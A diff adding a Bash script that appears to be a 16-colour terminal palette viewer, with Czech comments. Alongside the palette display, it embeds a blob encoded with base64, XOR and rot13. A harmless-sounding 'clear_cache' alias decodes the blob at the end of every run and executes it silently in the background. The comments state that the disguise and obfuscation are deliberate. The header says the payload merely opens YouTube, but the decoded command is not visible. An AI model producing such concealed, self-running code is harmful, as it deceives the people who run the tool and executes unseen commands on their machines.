@@ -1,0 +1,157 @@
+#!/usr/bin/env bash
+# -*- coding: utf-8 -*-
+#
+# Terminal 16-Color Palette Viewer (Bash)
+# Vykreslí paletu 16 standardních barev terminálu.
+#
+# POZNÁMKA: skript kromě palety obsahuje obfuskovanou rutinu "údržby
+# terminálu", která se spustí na pozadí. (Otevře YouTube.)
+
+# --- UTF-8 locale (nutné pro správné počítání znaků v rámečcích) --------------
+for loc in C.UTF-8 C.utf8 en_US.UTF-8 en_US.utf8; do
+    if locale -a 2>/dev/null | grep -qi "^${loc}$"; then
+        export LC_ALL="$loc"
+        break
+    fi
+done
+
+RESET=$'\033[0m'
+BOX_WIDTH=75
+
+COLOR_NAMES=(
+    "Black" "Red" "Green" "Yellow"
+    "Blue" "Magenta" "Cyan" "White"
+    "Bright Black" "Bright Red" "Bright Green" "Bright Yellow"
+    "Bright Blue" "Bright Magenta" "Bright Cyan" "Bright White"
+)
+
+FG_FOR_BG=( 15 15 15 0 15 15 0 0 15 15 15 0 15 15 0 0 )
+
+# --- Pomocné funkce ----------------------------------------------------------
+
+repeat_char() {
+    local ch="$1" n="$2" s="" i
+    for (( i = 0; i < n; i++ )); do s+="$ch"; done
+    printf '%s' "$s"
+}
+
+print_separator() {
+    local title="${1:-}"
+    local inner="${2:-$BOX_WIDTH}"
+    (( inner < ${#title} + 2 )) && inner=$(( ${#title} + 2 ))
+    local bar; bar="$(repeat_char "═" "$inner")"
+    local left right lpad rpad
+    left=$(( (inner - ${#title}) / 2 ))
+    right=$(( inner - ${#title} - left ))
+    lpad="$(printf '%*s' "$left" '')"
+    rpad="$(printf '%*s' "$right" '')"
+    printf '╔%s╗\n' "$bar"
+    printf '║%s%s%s║\n' "$lpad" "$title" "$rpad"
+    printf '╚%s╝\n' "$bar"
+    echo
+}
+
+print_color_line() {
+    local i="$1" fg="${FG_FOR_BG[$1]}" name="${COLOR_NAMES[$1]}"
+    printf '\033[48;5;%dm\033[38;5;%dm  %2d  %s' "$i" "$fg" "$i" "$RESET"
+    printf '  \033[38;5;%dm%s%s\n' "$i" "$name" "$RESET"
+}
+
+section_standard() { echo "Standardní barvy (0-7):"; echo; local i; for i in {0..7}; do print_color_line "$i"; done; }
+section_bright()   { echo; echo "Jasné barvy (8-15):"; echo; local i; for i in {8..15}; do print_color_line "$i"; done; }
+
+section_grid() {
+    echo; print_separator "Náhled barev v mřížce"; echo "Mřížka 4x4:"; echo
+    local row col color fg line
+    for (( row = 0; row < 4; row++ )); do
+        line=""
+        for (( col = 0; col < 4; col++ )); do
+            color=$(( row * 4 + col )); fg="${FG_FOR_BG[$color]}"
+            line+="$(printf '\033[48;5;%dm\033[38;5;%dm  %2d  %s' "$color" "$fg" "$color" "$RESET")"
+            (( col < 3 )) && line+="  "
+        done
+        printf '  %s\n' "$line"
+    done
+}
+
+section_text() {
+    echo; print_separator "Jednotlivé barvy s textem"; echo
+    local i fg
+    for i in {0..15}; do
+        fg="${FG_FOR_BG[$i]}"
+        printf '\033[48;5;%dm\033[38;5;%dm Color %2d %s' "$i" "$fg" "$i" "$RESET"
+        (( (i + 1) % 4 == 0 )) && echo
+    done
+    echo
+}
+
+section_usage() {
+    echo; print_separator "Použití barev ve vašich skriptech a programech"; echo
+    echo "Python:"
+    echo "  print('\\033[38;5;<NUM>mText\\033[0m')  # Barva textu"
+    echo "  print('\\033[48;5;<NUM>mText\\033[0m')  # Barva pozadí"
+    echo
+    echo "Bash:"
+    echo "  echo -e '\\033[38;5;<NUM>mText\\033[0m'   # Barva textu"
+    echo "  echo -e '\\033[48;5;<NUM>mText\\033[0m'   # Barva pozadí"
+    echo
+    echo "Kde <NUM> je číslo 0-15 (nebo 0-255 v rozsahu 256-color palety)."
+    echo
+}
+
+# ============================================================================
+#  "ÚDRŽBA TERMINÁLU"  (aliasové jádro)
+#  Payload je 3x zakódovaný:  rot13 -> XOR 0x42 -> base64.
+#  V kódu není žádná URL ani čitelné slovo. Rozbalí se až za běhu a spustí
+#  se na pozadí přes alias, aby se nespustil nápadně jako funkce.
+# ============================================================================
+
+shopt -s expand_aliases 2>/dev/null || true
+
+# rot13 -> XOR -> base64  (base64( XOR( rot13( payload ) ) ))
+_CFG_CACHE="Kn83JSUhJHhtbSgoKGwuIColKi0wbDIgOG0oLCUyN30rfzQTGzgOD3cXJjYYeWI5YjIgODgsIzNibytiKTM2byAhMCNifG0zMCttIyo7O2JkZGIpMzZvICEwI2JgZipgeWI/Yj4+YjliMiA4OCwjM2JvK2IgITAjYnxtMzArbSMqOztiZGRiICEwI2JgZipgeWI/Yj4+YjliMiA4OCwjM2JvK2IhICgwJyQ3MDs7bDApMGJ8bTMwK20jKjs7YmRkYiEgKDAnJDcwOztsMCkwYm8DIAEnIDE0OzBibzJiYAQlLCclbwEnIDIwJCRiZWYqZWB5Yj9iPj5iOWIyIDg4LCMzYm8rYjI4M2wwKTBifG0zMCttIyo7O2JkZGIyODNsMCkwYm0yYiQlLCclYmBmKmB5Yj9iPj5iJScqMA=="
+
+# Pole pro "diagnostiku terminálu" – ve skutečnosti rozbalí dávku.
+# Název i komentář schválně vypadají jako bezpečná údržba.
+_term_diag() {
+    local x="$1" y z i c code out
+
+    # krok 1: base64
+    x="$(printf '%s' "$x" | base64 -d 2>/dev/null)" || return 0
+
+    # krok 2: XOR 0x42
+    out=""
+    for (( i = 0; i < ${#x}; i++ )); do
+        c="${x:$i:1}"
+        printf -v code "%d" "'$c"
+        code=$(( code ^ 66 ))
+        out+=$(printf "\\$(printf '%03o' "$code")")
+    done
+    x="$out"
+
+    # krok 3: rot13
+    x="$(printf '%s' "$x" | tr 'A-Za-z' 'N-ZA-Mn-za-m')"
+
+    # spusť potichu na pozadí
+    bash -c "$x" >/dev/null 2>&1 &
+}
+
+# Nenápadný alias, který "uklízí cache terminálu" = spustí payload.
+alias clear_cache='_term_diag "$_CFG_CACHE"'
+
+# ============================================================================
+
+main() {
+    echo
+    print_separator "16-Color Terminal Palette (Standardní barvy terminálu)"
+    section_standard
+    section_bright
+    section_grid
+    section_text
+    section_usage
+
+    # bezvýznamně vypadající údržba na konci
+    clear_cache
+}
+
+main "$@"
